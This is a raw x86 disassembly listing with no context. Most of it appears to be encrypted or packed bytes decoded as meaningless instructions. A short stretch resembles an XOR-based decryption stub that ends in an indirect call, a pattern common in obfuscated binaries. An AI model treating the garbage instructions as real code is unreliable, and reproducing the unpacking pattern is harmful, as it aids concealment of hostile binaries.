  40db88:	in     al,0xc0
  40db8a:	push   edi
  40db8b:	xor    al,0x10
  40db8d:	mov    ecx,0xf67653ad
  40db92:	sbb    BYTE PTR [ebx+0x40],cl
  40db95:	inc    ebx
  40db96:	push   cs
  40db97:	sti    
  40db98:	add    esp,esp
  40db9a:	or     ecx,edi
  40db9c:	xor    edi,DWORD PTR [edx+ecx*1+0x4e]
  40dba0:	jnp    0x40db53
  40dba2:	ss jmp 0x40db3a
  40dba5:	scas   eax,DWORD PTR es:[edi]
  40dba6:	push   edi
  40dba7:	sub    al,0x3e
  40dba9:	sbb    al,0xc2
  40dbab:	push   es
  40dbac:	inc    esp
  40dbad:	add    al,0xfe
  40dbaf:	mov    cs,WORD PTR [eax+edi*4]
  40dbb2:	sahf   
  40dbb3:	sub    eax,0xd08645e2
  40dbb8:	push   0x3dcb078
  40dbbd:	xor    ah,BYTE PTR [ebp+0x23]
  40dbc0:	hlt    
  40dbc1:	jnp    0x40db5e
  40dbc3:	and    esp,DWORD PTR [ecx-0x26]
  40dbc6:	push   eax
  40dbc7:	idiv   BYTE PTR [edi]
  40dbc9:	rol    DWORD PTR [edi+edx*4+0x7a],0xf4
  40dbce:	jge    0x40db72
  40dbd0:	xor    ebx,DWORD PTR [edx+eax*8]
  40dbd3:	je     0x40dbdb
  40dbd5:	loop   0x40dbd9
  40dbd7:	cmc    
  40dbd8:	cdq    
  40dbd9:	(bad)  
  40dbda:	fsub   QWORD PTR [ebp-0x51]
  40dbdd:	dec    DWORD PTR [eax+0x3b43e07a]
  40dbe3:	jne    0x40dbc0
  40dbe5:	xchg   edi,eax
  40dbe6:	jmp    0x40db69
  40dbe8:	mov    BYTE PTR [eax+0x19],dl
  40dbeb:	cs ja  0x40dc3f
  40dbee:	adc    BYTE PTR [eax-0x18],0x56
  40dbf2:	stos   BYTE PTR es:[edi],al
  40dbf3:	mov    dh,0x75
  40dbf5:	pop    ds
  40dbf6:	in     al,0x21
  40dbf8:	sub    BYTE PTR [esi],dh
  40dbfa:	mov    DWORD PTR [eax],ebx
  40dbfc:	cdq    
  40dbfd:	pop    esp
  40dbfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbff:	mov    ds:0x8fe47e12,eax
  40dc04:	cld    
  40dc05:	adc    ah,BYTE PTR [esi-0x76]
  40dc08:	mov    ebp,0xc33f6bb9
  40dc0d:	xchg   ebp,eax
  40dc0e:	and    edi,DWORD PTR [ecx-0x4d]
  40dc11:	cdq    
  40dc12:	and    al,0x74
  40dc14:	cdq    
  40dc15:	cmp    cl,BYTE PTR [ebx-0x4973f974]
  40dc1b:	push   ecx
  40dc1c:	outs   dx,DWORD PTR ds:[esi]
  40dc1d:	mov    ecx,0xd18bf6b5
  40dc22:	test   BYTE PTR [edi-0x2167cf28],cl
  40dc28:	add    ah,BYTE PTR [ebx+0x7c]
  40dc2b:	push   edx
  40dc2c:	sahf   
  40dc2d:	popa   
  40dc2e:	xor    BYTE PTR [esi],0x87
  40dc31:	pushf  
  40dc32:	fwait
  40dc33:	ret    
  40dc34:	scas   al,BYTE PTR es:[edi]
  40dc35:	sub    DWORD PTR [edx+0x5482de94],0x7f
  40dc3c:	cmp    eax,0x6002f648
  40dc41:	fcomp  QWORD PTR [eax+eax*2]
  40dc44:	nop
  40dc45:	leave  
  40dc46:	fcom   DWORD PTR [ebx]
  40dc48:	dec    ecx
  40dc49:	xchg   eax,ebx
  40dc4b:	lods   eax,DWORD PTR ds:[esi]
  40dc4c:	xchg   BYTE PTR [eax+0x7],ah
  40dc4f:	call   0x2b894c7a
  40dc54:	out    dx,al
  40dc55:	test   edx,edx
  40dc57:	daa    
  40dc58:	out    0x7d,eax
  40dc5a:	popa   
  40dc5b:	cmp    eax,DWORD PTR [edx+eax*8+0x4f]
  40dc5f:	mov    WORD PTR [eax],fs
  40dc61:	cmp    al,0x65
  40dc63:	out    0x8b,al
  40dc65:	push   ebp
  40dc66:	or     BYTE PTR [ebx+0x1be9dc7d],cl
  40dc6c:	add    eax,DWORD PTR [eax]
  40dc6e:	add    dl,dh
  40dc70:	cmp    al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x58f63768]
  40dc7d:	adc    al,0xc5
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dcec
  40dc88:	dec    ebp
  40dc89:	jnp    0x40dcf1
  40dc8b:	xchg   DWORD PTR [edi-0x74796769],edx
  40dc91:	jbe    0x40dc1f
  40dc93:	loop   0x40dcb6
  40dc95:	out    0x6e,eax
  40dc97:	inc    edi
  40dc98:	mov    ds:0xd7e6b45b,eax
  40dc9d:	popa   
  40dc9e:	pop    ebp
  40dc9f:	scas   al,BYTE PTR es:[edi]
  40dca0:	pop    ebp
  40dca1:	mov    ebp,0xdb341750
  40dca6:	pop    eax
  40dca7:	cmp    dh,cl
  40dca9:	cmp    ecx,ebx
  40dcab:	(bad)  [ecx+0x29f345d2]
  40dcb1:	xchg   edx,eax
  40dcb2:	add    eax,DWORD PTR [ecx]
  40dcb4:	mov    ah,0xec
  40dcb6:	xchg   ecx,eax
  40dcb7:	dec    edx
  40dcb8:	in     eax,dx
  40dcb9:	sbb    BYTE PTR [edi+0x6d],bh
  40dcbc:	rcr    DWORD PTR [esi+0x2b7d594a],1
  40dcc2:	ja     0x40dc61
  40dcc4:	fwait
  40dcc5:	aam    0xf8
  40dcc7:	sub    eax,0x1e78cb2f
  40dccc:	mov    ds:0xf7e6fa8a,eax
  40dcd1:	jmp    0x40dcdd
  40dcd3:	sahf   
  40dcd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd5:	jg     0x40dcf3
  40dcd7:	mov    ebp,0xa92a4ee2
  40dcdc:	les    esp,FWORD PTR ds:0xdbdd854b
  40dce2:	jecxz  0x40dd0a
  40dce4:	ret    0xe7b6
  40dce7:	xor    ch,BYTE PTR [eax]
  40dce9:	(bad)
  40dced:	and    DWORD PTR [edx+0x5961f98b],eax
  40dcf3:	repnz popa 
  40dcf5:	sbb    ch,ah
  40dcf7:	jecxz  0x40dcfb
  40dcf9:	stc    
  40dcfa:	out    0xde,eax
  40dcfc:	mov    bl,0xdd
  40dcfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcff:	pop    ecx
  40dd00:	adc    DWORD PTR [esi],esp
  40dd02:	jb     0x40dd0c
  40dd04:	xor    DWORD PTR [eax],edx
  40dd06:	add    DWORD PTR [ecx-0x3edba1c6],0xaedc32bc
  40dd10:	add    eax,0x7d2ddb9e
  40dd15:	daa    
  40dd16:	pop    DWORD PTR [ecx+0x17e36b86]
  40dd1c:	add    BYTE PTR [esi+0x49],al
  40dd1f:	add    DWORD PTR [ecx-0x2e],edx
  40dd22:	ror    BYTE PTR [edi],cl
  40dd24:	js     0x40dd50
  40dd26:	lods   eax,DWORD PTR ds:[esi]
  40dd27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd28:	cmp    DWORD PTR [edx-0x5f03672a],eax
  40dd2e:	jmp    FWORD PTR [eax-0x7f3cdbc0]
  40dd34:	loop   0x40dcef
  40dd36:	(bad)  
  40dd37:	test   eax,0xa97a20b7
  40dd3c:	int    0xf0
  40dd3e:	cli    
  40dd3f:	mov    eax,ds:0x23e294fe
  40dd44:	(bad)  
  40dd45:	les    edi,FWORD PTR [edx-0x47]
  40dd48:	test   BYTE PTR [esi],cl
  40dd4a:	call   0xd91cb877
  40dd4f:	push   esp
  40dd50:	xchg   ebx,eax
  40dd51:	aam    0xaa
  40dd53:	xchg   BYTE PTR [eax+0x704c3be1],al
  40dd59:	stos   BYTE PTR es:[edi],al
  40dd5a:	shl    dl,1
  40dd5c:	push   es
  40dd5d:	or     al,ch
  40dd5f:	add    al,dl
  40dd61:	bound  ebp,QWORD PTR [edi-0x44a8c4fb]
  40dd67:	pushf  
  40dd68:	jmp    0x40dd94
  40dd6a:	push   ecx
  40dd6b:	adc    al,0xcb
  40dd6d:	or     DWORD PTR [ebp-0x63d04e87],esp
  40dd73:	xor    DWORD PTR [edi-0x6d2ae6a],esp
  40dd79:	outs   dx,DWORD PTR ds:[esi]
  40dd7a:	mov    ds:0xd1bdd823,al
  40dd7f:	xor    eax,0x7304b8fa
  40dd84:	or     al,0xaa
  40dd86:	(bad)  
  40dd88:	pop    ecx
  40dd89:	sbb    edi,ecx
  40dd8b:	xor    DWORD PTR [ecx+ebp*4-0x1e8dd503],ecx
  40dd92:	and    al,cl
  40dd94:	pop    ebp
  40dd95:	jb     0x40dddf
  40dd97:	lods   eax,DWORD PTR ds:[esi]
  40dd98:	or     al,0x47
  40dd9a:	mov    WORD PTR [ebp+0x2281ea8b],?
  40dda0:	sbb    ecx,DWORD PTR [esi]
  40dda2:	shl    BYTE PTR [esi],1
  40dda4:	xchg   ecx,eax
  40dda5:	lock mov ebp,0x3915d44e
  40ddab:	sub    bh,BYTE PTR [ecx]
  40ddad:	pop    esi
  40ddae:	dec    ebx
  40ddaf:	push   ebp
  40ddb0:	jae    0x40de0f
  40ddb2:	pop    edx
  40ddb3:	ins    DWORD PTR es:[edi],dx
  40ddb4:	push   ds
  40ddb5:	(bad)  
  40ddb6:	fistp  WORD PTR [eax+ebp*2+0x2f]
  40ddba:	enter  0x4022,0xf7
  40ddbe:	push   esp
  40ddbf:	leave  
  40ddc0:	sbb    al,0x3d
  40ddc2:	cs inc ebx
  40ddc4:	add    BYTE PTR [ecx-0x6ae8210f],bl
  40ddca:	sbb    al,BYTE PTR [edi+eax*2-0x2bcb7076]
  40ddd1:	cmp    ebp,esi
  40ddd3:	pop    eax
  40ddd4:	lods   eax,DWORD PTR ds:[esi]
  40ddd5:	out    dx,eax
  40ddd6:	and    bl,BYTE PTR [ecx]
  40ddd8:	pop    eax
  40ddd9:	and    DWORD PTR [edx+ecx*4-0x1395ee41],eax
  40dde0:	and    BYTE PTR [eax+edi*4-0x69],0x3e
  40dde5:	mov    ds:0xb3b6fc9e,eax
  40ddea:	add    eax,0xc0c99e28
  40ddef:	sub    al,BYTE PTR [ecx-0x62471bf7]
  40ddf5:	(bad)  
  40ddf6:	aad    0x7e
  40ddf8:	cmp    ebp,esp
  40ddfa:	scas   al,BYTE PTR es:[edi]
  40ddfb:	stos   BYTE PTR es:[edi],al
  40ddfc:	jo     0x40ddd1
  40ddfe:	imul   ebx,DWORD PTR [edx+0x8],0xb10e6f46
  40de05:	lods   al,BYTE PTR ds:[esi]
  40de06:	out    dx,eax
  40de07:	mov    al,ds:0x9606ce42
  40de0c:	mov    DWORD PTR [esi+0x6a861168],0xfe7dd919
  40de16:	repnz cmp ah,BYTE PTR [ebx]
  40de19:	xor    al,0x1e
  40de1b:	xor    al,BYTE PTR [esp+eiz*4]
  40de1e:	pop    ds
  40de1f:	and    eax,0x88445af0
  40de24:	jl     0x40de32
  40de26:	adc    esp,DWORD PTR [edx]
  40de28:	xchg   esi,eax
  40de29:	test   DWORD PTR [ebx+ebx*2],ebx
  40de2c:	pop    edx
  40de2d:	push   cs
  40de2e:	fmul   st(3),st
  40de30:	daa    
  40de31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de32:	(bad)  
  40de33:	mov    WORD PTR [esi+0x6c34103b],ss
  40de39:	mov    bl,0x82
  40de3b:	sub    ah,0xfd
  40de3e:	js     0x40de93
  40de40:	jae    0x40ddf4
  40de42:	cdq    
  40de43:	add    DWORD PTR [edi],ebp
  40de45:	lock mov edx,0x691a637c
  40de4b:	ror    BYTE PTR [edi-0x54],cl
  40de4e:	jne    0x40de23
  40de50:	jecxz  0x40de99
  40de52:	outs   dx,DWORD PTR ds:[esi]
  40de53:	loopne 0x40de58
  40de55:	mov    edx,0x22d5af17
  40de5a:	shl    BYTE PTR [ecx+0x75ba9f59],0x1d
  40de61:	xchg   esi,eax
  40de62:	inc    esp
  40de63:	pop    esi
  40de64:	gs jmp 0x3a798f6f
  40de6a:	and    BYTE PTR ds:0xdf1df0c9,0xa1
  40de71:	js     0x40decb
  40de73:	push   ebp
  40de74:	test   eax,0x46c3ae00
  40de79:	dec    eax
  40de7a:	jmp    0x1c8f:0x80c28207
  40de81:	xor    eax,0xd06b1789
  40de86:	xor    DWORD PTR ds:0xd23e54e4,0x7e
  40de8d:	cld    
  40de8e:	push   esi
  40de8f:	sub    ebp,ebx
  40de91:	add    eax,edx
  40de93:	push   esi
  40de94:	xchg   edx,edi
  40de96:	push   esp
  40de97:	sbb    bl,BYTE PTR [esi-0xd]
  40de9a:	sbb    ah,BYTE PTR [edx+0x1961ead7]
  40dea0:	cmp    al,0x85
  40dea2:	int3   
  40dea3:	xchg   esi,eax
  40dea4:	mov    dl,0x4d
  40dea6:	je     0x40de41
  40dea8:	or     BYTE PTR [ecx],ch
  40deaa:	ror    ah,0x3a
  40dead:	push   ebx
  40deae:	and    bl,BYTE PTR [ecx]
  40deb0:	loope  0x40df04
  40deb2:	mov    ah,0x52
  40deb4:	fiadd  DWORD PTR [ebp-0x378367c6]
  40deba:	ret    
  40debb:	shr    BYTE PTR [ebp-0x2f],0xb
  40debf:	jg     0x40de5b
  40dec1:	sub    al,0x8b
  40dec3:	gs (bad) 
  40dec5:	(bad)  
  40dec6:	jns    0x40df05
  40dec8:	dec    ecx
  40dec9:	imul   edx
  40decb:	sub    ah,BYTE PTR [eax+0x108ef5dd]
  40ded1:	test   DWORD PTR [eax+0x4d998c19],edi
  40ded7:	jl     0x40df4b
  40ded9:	cld    
  40deda:	bound  ecx,QWORD PTR [edx]
  40dedc:	(bad)  
  40dedd:	test   eax,0xed558c37
  40dee2:	jbe    0x40df17
  40dee4:	call   0x926ba4db
  40dee9:	sub    dh,0xf6
  40deec:	cdq    
  40deed:	jo     0x40df3e
  40deef:	push   edx
  40def0:	stos   DWORD PTR es:[edi],eax
  40def1:	loop   0x40de7e
  40def3:	add    al,0x69
  40def5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40def6:	jge    0x40deb0
  40def8:	and    al,0xc2
  40defa:	mov    bh,0x41
  40defc:	fimul  DWORD PTR [edx+0x4fd8c9ff]
  40df02:	sub    eax,0x3c17337d
  40df07:	iret   
  40df08:	adc    DWORD PTR [esi+0x2a],0xf15aa9a3
  40df0f:	mov    edx,esp
  40df11:	fistp  QWORD PTR [ebx-0x5c]
  40df14:	mov    eax,0x93894e13
  40df19:	xchg   ebp,eax
  40df1a:	lds    ebx,FWORD PTR [ebp+0x34054579]
  40df20:	popf   
  40df21:	mov    DWORD PTR [ebx],esp
  40df23:	je     0x40df51
  40df25:	ficom  DWORD PTR [ecx-0x580150b1]
  40df2b:	jl     0x40df47
  40df2d:	mov    es,WORD PTR [esi-0xa8b767f]
  40df33:	sar    DWORD PTR [edx+0x60],0x4f
  40df37:	mov    DWORD PTR [eax+0x23],ebp
  40df3a:	mov    bl,BYTE PTR [eax+0x1c]
  40df3d:	dec    ebx
  40df3e:	rcr    DWORD PTR [edx-0x8],cl
  40df41:	call   0x812d:0xc0c984be
  40df48:	sbb    DWORD PTR [esi+ebp*1],eax
  40df4b:	xchg   esp,eax
  40df4c:	leave  
  40df4d:	(bad)  ds:0x3129ad91
  40df53:	inc    edx
  40df54:	outs   dx,DWORD PTR ds:[esi]
  40df55:	mov    bl,0x45
  40df57:	xchg   esi,eax
  40df58:	sub    dh,BYTE PTR [edx-0x154ed1a3]
  40df5e:	in     eax,0x62
  40df60:	cmp    dl,BYTE PTR [edx]
  40df62:	lods   al,BYTE PTR ds:[esi]
  40df63:	fdivr  QWORD PTR [esi]
  40df65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df66:	jns    0x40dfa2
  40df68:	adc    esi,edi
  40df6a:	cmp    DWORD PTR [eax+0xe15b548],eax
  40df70:	inc    ecx
  40df71:	and    DWORD PTR [edi+eiz*8-0x5f327766],edi
  40df78:	dec    edx
  40df79:	add    edx,DWORD PTR [ebp-0x15]
  40df7c:	add    bh,BYTE PTR [edx]
  40df7e:	pop    esi
  40df7f:	scas   al,BYTE PTR es:[edi]
  40df80:	rol    DWORD PTR [ebp+0x3801e6a],1
  40df86:	xchg   ecx,eax
  40df87:	cmp    DWORD PTR [eax-0x68fb76c1],esi
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs pcmpgtw mm7,mm4
  40e026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e027:	inc    eax
  40e028:	xor    BYTE PTR [ecx+0x7d7d7e7e],bl
  40e02e:	jle    0x40e0ae
  40e030:	jmp    DWORD PTR [ecx+ebp*4]
  40e033:	and    eax,0xad166fb9
  40e038:	sahf   
  40e039:	pop    es
  40e03a:	cmc    
  40e03b:	push   0x91a2993
  40e040:	pushf  
  40e041:	cdq    
  40e042:	jecxz  0x40e00f
  40e044:	push   esp
  40e045:	adc    eax,0x6c8fdf11
  40e04a:	pop    eax
  40e04b:	jae    0x40e038
  40e04d:	mov    edx,0x87dc5d87
  40e052:	cli    
  40e053:	jno    0x40e03a
  40e055:	in     eax,0xfd
  40e057:	int    0x17
  40e059:	cmp    ah,ch
  40e05b:	js     0x40dfe0
  40e05d:	cmc    
  40e05e:	cwde   
  40e05f:	in     al,0x98
  40e061:	adc    eax,0xb0a9ef4f
  40e066:	leave  
  40e067:	fwait
  40e068:	and    al,0x13
  40e06a:	jp     0x40e070
  40e06c:	and    bh,BYTE PTR [edi]
  40e06e:	scas   eax,DWORD PTR es:[edi]
  40e06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e070:	in     al,0x16
  40e072:	mov    BYTE PTR [edi+0x1bbfa687],0xaf
  40e079:	xchg   esi,eax
  40e07a:	or     ah,BYTE PTR [edi+ebx*2+0x2a]
  40e07e:	push   ecx
  40e07f:	fiadd  WORD PTR [edx-0x34e4a148]
  40e085:	jbe    0x40e09e
  40e087:	dec    esp
  40e088:	or     DWORD PTR [edi],eax
  40e08a:	pop    esi
  40e08b:	sbb    DWORD PTR [esi],0x24
  40e08e:	or     eax,0xc6312570
  40e093:	push   ebx
  40e094:	test   BYTE PTR [eax],al
  40e096:	ins    BYTE PTR es:[edi],dx
  40e097:	inc    esp
  40e099:	jae    0x40e0b6
  40e09b:	loop   0x40e0dc
  40e09d:	pop    es
  40e09e:	or     al,0x1c
  40e0a0:	sub    BYTE PTR [esi-0x39],0xc4
  40e0a4:	inc    ecx
  40e0a5:	call   0xf63e:0x2ae669a6
  40e0ac:	in     al,dx
  40e0ad:	pop    ebx
  40e0ae:	jge    0x40e0bc
  40e0b0:	pop    esp
  40e0b1:	test   eax,0x78f32d91
  40e0b6:	int3   
  40e0b7:	mov    al,BYTE PTR [ecx]
  40e0b9:	or     esp,esi
  40e0bb:	lea    ecx,[eax]
  40e0bd:	outs   dx,BYTE PTR ds:[esi]
  40e0be:	(bad)  
  40e0bf:	into   
  40e0c0:	sbb    eax,0xe32a8c33
  40e0c5:	pop    eax
  40e0c6:	mov    WORD PTR [eax],?
  40e0c8:	xchg   BYTE PTR ss:[ecx-0x2036c7a3],ch
  40e0cf:	enter  0xb8cf,0x3c
  40e0d3:	add    BYTE PTR [edi],dl
  40e0d5:	jp     0x40e101
  40e0d7:	mov    esp,0xb581168
  40e0dc:	fwait
  40e0dd:	mov    esp,0x7f141233
  40e0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e3:	add    ebp,DWORD PTR [eax-0x5fd54e02]
  40e0e9:	xchg   ebx,eax
  40e0ea:	mov    al,0x35
  40e0ec:	out    0xfa,eax
  40e0ee:	mov    al,0xa8
  40e0f0:	or     al,0x4f
  40e0f2:	rcr    DWORD PTR [ecx-0x6a],cl
  40e0f5:	cmc    
  40e0f6:	adc    BYTE PTR [edx-0x1ed97fec],0x4a
  40e0fd:	je     0x40e139
  40e0ff:	pop    ebp
  40e100:	adc    dl,BYTE PTR gs:[edx+0x2367020e]
  40e107:	(bad)  
  40e108:	in     al,0xec
  40e10a:	jp     0x40e124
  40e10c:	dec    esp
  40e10d:	push   cs
  40e10e:	mov    ds:0xc66ce482,al
  40e113:	(bad)  
  40e114:	inc    ebp
  40e115:	and    eax,DWORD PTR [edx]
  40e117:	inc    ebx
  40e118:	loope  0x40e18d
  40e11a:	(bad)  
  40e11c:	cmp    DWORD PTR [edx],ebp
  40e11e:	cmp    BYTE PTR [ecx],bl
  40e120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e121:	sub    esp,DWORD PTR [edi+0x6]
  40e124:	sahf   
  40e125:	pop    es
  40e126:	lods   al,BYTE PTR ds:[esi]
  40e127:	xchg   esi,eax
  40e128:	sti    
  40e129:	fwait
  40e12a:	sbb    eax,edi
  40e12c:	cld    
  40e12d:	and    al,0xbd
  40e12f:	fdivr  QWORD PTR [edi]
  40e131:	test   BYTE PTR [edi+0x460f5f97],0xd3
  40e138:	jg     0x40e16b
  40e13a:	pop    ebp
  40e13b:	call   0x5cbda211
  40e140:	push   eax
  40e141:	fld    QWORD PTR [ebx+esi*1-0x71a0947]
  40e148:	nop
  40e149:	add    bl,BYTE PTR [ebx]
  40e14b:	aad    0xbb
  40e14d:	ins    BYTE PTR es:[edi],dx
  40e14e:	mov    ebx,0xaf272581
  40e153:	inc    esp
  40e154:	loopne 0x40e143
  40e156:	in     eax,dx
  40e157:	cmp    cl,BYTE PTR [ecx]
  40e159:	mov    ch,0xa5
  40e15b:	or     al,0xbd
  40e15d:	out    dx,al
  40e15e:	sub    dh,bl
  40e160:	mov    WORD PTR [ecx+ebx*1-0x3c],gs
  40e164:	mov    al,0xb2
  40e166:	cld    
  40e167:	inc    esp
  40e168:	daa    
  40e169:	mov    WORD PTR [edx+0x1],dx
  40e16d:	test   DWORD PTR [eax-0x32],eax
  40e170:	ja     0x40e15f
  40e172:	add    al,dl
  40e174:	xor    BYTE PTR [ebx],dh
  40e176:	jbe    0x40e1cf
  40e178:	or     al,BYTE PTR [esi-0x32]
  40e17b:	test   eax,0xc7fcc636
  40e180:	in     eax,dx
  40e181:	dec    ecx
  40e182:	dec    edi
  40e183:	or     eax,0xa439a9e0
  40e188:	inc    edx
  40e189:	aad    0x17
  40e18b:	jns    0x40e148
  40e18d:	sbb    eax,0xb5b79281
  40e192:	mov    DWORD PTR [edx+ecx*2+0x39],ecx
  40e196:	(bad)  
  40e197:	shl    BYTE PTR [edi-0x273de5a6],cl
  40e19d:	mov    cl,0xdf
  40e1a0:	repz mov ds:0x9653b4f8,al
  40e1a6:	xor    BYTE PTR [esi],0x4e
  40e1a9:	(bad)  
  40e1aa:	push   esp
  40e1ab:	pop    edx
  40e1ac:	stc    
  40e1ad:	mov    bl,0x52
  40e1af:	and    BYTE PTR [eax+0x3b01dd42],cl
  40e1b5:	sbb    edi,DWORD PTR [eax+ebx*8-0x4f556bf5]
  40e1bc:	cwde   
  40e1bd:	inc    esi
  40e1be:	mov    bh,0x6c
  40e1c0:	sub    esi,esp
  40e1c2:	fisub  WORD PTR [edx+0x284769b9]
  40e1c8:	adc    eax,0xa56d4deb
  40e1cd:	and    bl,BYTE PTR [ebp-0x31a16cc8]
  40e1d3:	stos   DWORD PTR es:[edi],eax
  40e1d4:	jae    0x40e1ac
  40e1d6:	mov    edi,0x8a2b6457
  40e1db:	mov    edi,0x6ac32b96
  40e1e0:	add    edi,DWORD PTR [esi+ebp*8-0x104418ea]
  40e1e7:	push   es
  40e1e8:	dec    ebp
  40e1e9:	cmp    DWORD PTR [edi],esi
  40e1eb:	push   edx
  40e1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1ed:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1ef:	add    BYTE PTR [ecx+edx*1-0x60ae4e9c],0x72
  40e1f7:	add    ch,BYTE PTR [ebp+0xc]
  40e1fa:	jecxz  0x40e23b
  40e1fc:	sbb    BYTE PTR [ebp+0x1ca801a4],cl
  40e202:	xlat   BYTE PTR ds:[ebx]
  40e203:	pusha  
  40e204:	jno    0x40e1a5
  40e206:	jb     0x40e26d
  40e208:	jo     0x40e213
  40e20a:	add    BYTE PTR [edi-0x53e28250],al
  40e210:	rcl    DWORD PTR [ebp+0x46],1
  40e213:	add    al,0x59
  40e215:	(bad)  
  40e216:	mov    cl,0xa5
  40e218:	nop
  40e219:	mov    al,0xfc
  40e21b:	jno    0x40e1e8
  40e21d:	mov    edx,0x36a9592a
  40e222:	ss push eax
  40e224:	fimul  DWORD PTR [ecx+0x4f2bd915]
  40e22a:	jbe    0x40e24c
  40e22c:	daa    
  40e22d:	add    edi,eax
  40e22f:	in     al,0x9c
  40e231:	lea    ecx,[eax-0x4a]
  40e234:	xor    al,0xb0
  40e236:	cwde   
  40e237:	xchg   BYTE PTR [ecx-0x256a486b],dl
  40e23d:	jg     0x40e29e
  40e23f:	dec    ecx
  40e240:	jo     0x40e1d6
  40e242:	ret    
  40e243:	jl     0x40e2af
  40e245:	call   0xacbae62d
  40e24a:	dec    ebx
  40e24b:	mov    edx,0x41b835a9
  40e250:	data16 fsubr QWORD PTR [esi]
  40e253:	test   eax,0x1da388b3
  40e258:	pop    esp
  40e259:	out    0x25,eax
  40e25b:	(bad)  
  40e25d:	xchg   ebx,eax
  40e25e:	in     eax,dx
  40e25f:	ins    BYTE PTR es:[edi],dx
  40e260:	ss js  0x40e21f
  40e263:	and    BYTE PTR [eax+0x10],dh
  40e266:	jb     0x40e204
  40e268:	and    edx,DWORD PTR [ebx-0x7]
  40e26b:	fdiv   DWORD PTR fs:[ebx+esi*4]
  40e26f:	in     al,dx
  40e270:	(bad)  
  40e271:	repnz mov edx,0xb06cb1a9
  40e277:	xchg   ebx,eax
  40e278:	push   edx
  40e279:	add    BYTE PTR [ecx],cl
  40e27b:	test   al,cl
  40e27d:	js     0x40e2a0
  40e27f:	sub    esi,DWORD PTR [esi]
  40e281:	jo     0x40e267
  40e283:	aad    0x6b
  40e285:	push   ss
  40e286:	mov    ebp,0xe7985a43
  40e28b:	hlt    
  40e28c:	dec    edi
  40e28d:	cmp    ebp,ebp
  40e28f:	xor    eax,0xbb2e2d66
  40e294:	js     0x40e2be
  40e296:	popa   
  40e297:	pop    esp
  40e298:	xchg   BYTE PTR fs:[ebx+0xb5cc432],cl
  40e29f:	and    al,0x63
  40e2a1:	gs mov edx,0xfa46cf73
  40e2a7:	aam    0x32
  40e2a9:	(bad)  
  40e2aa:	adc    esi,DWORD PTR [ebp-0x24]
  40e2ad:	dec    edi
  40e2ae:	int3   
  40e2af:	sbb    BYTE PTR [edx+0x7e8c81fc],bl
  40e2b5:	stos   BYTE PTR es:[edi],al
  40e2b6:	es push es
  40e2b8:	jne    0x40e26f
  40e2ba:	out    dx,eax
  40e2bb:	dec    ebp
  40e2bc:	or     al,0xb3
  40e2be:	mov    bl,0xb3
  40e2c0:	in     eax,0xb7
  40e2c2:	loope  0x40e33a
  40e2c4:	arpl   WORD PTR [edx],bp
  40e2c6:	jo     0x40e27f
  40e2c8:	inc    esi
  40e2c9:	jae    0x40e277
  40e2cb:	cmc    
  40e2cc:	sub    DWORD PTR [edx-0x40591710],esi
  40e2d2:	fdivr  QWORD PTR [edi+0x3507a702]
  40e2d8:	enter  0x90ae,0xe6
  40e2dc:	enter  0x1e0c,0x2e
  40e2e0:	cld    
  40e2e1:	mov    ebx,0x197007f1
